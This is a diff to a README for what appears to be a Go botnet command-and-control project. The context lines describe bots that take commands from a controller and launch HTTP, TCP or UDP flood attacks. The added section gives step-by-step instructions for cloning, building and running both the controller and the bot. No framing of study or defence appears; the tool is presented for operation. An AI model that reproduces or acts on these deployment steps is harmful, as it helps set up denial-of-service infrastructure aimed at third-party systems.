@@ -41,12 +41,47 @@ The botnet controller manages user connections, handles bot commands, and makes 
 - STOP command handling for bot shutdown
 
 ### Usage:
-
 1. Configure the bot with the controller's IP and port.
 2. Connect the bot to the controller.
 3. Receive commands from the controller to perform attacks.
 4. Execute HTTP, TCP, or UDP attacks based on received commands.
 5. Stop the bot on receiving the STOP command from the controller.
+
+### Installation and Running
+
+#### 1. Install Go
+
+First, ensure Go is installed on your system. You can download and install Go from the [official Go website](https://golang.org/dl/). Follow the installation instructions specific to your operating system.
+
+#### 2. Set Up Botnet Controller
+
+```bash
+# Clone the botnet controller repository
+git clone https://github.com/Birdo1221/Better-Go-Cnc.git
+
+# Navigate to the controller directory
+cd Better-Go-Cnc/controller
+
+# Build and run the controller
+go build
+./controller
+```
+# Clone the botnet client repository
+```
+git clone https://github.com/Birdo1221/Better-Go-Cnc.git
+```
+# Navigate to the bot directory
+```
+cd Better-Go-Cnc/bot
+```
+# Build and run the bot
+```
+go build ./bot
+```
+
+
+
+
 
 ## Contributing
 
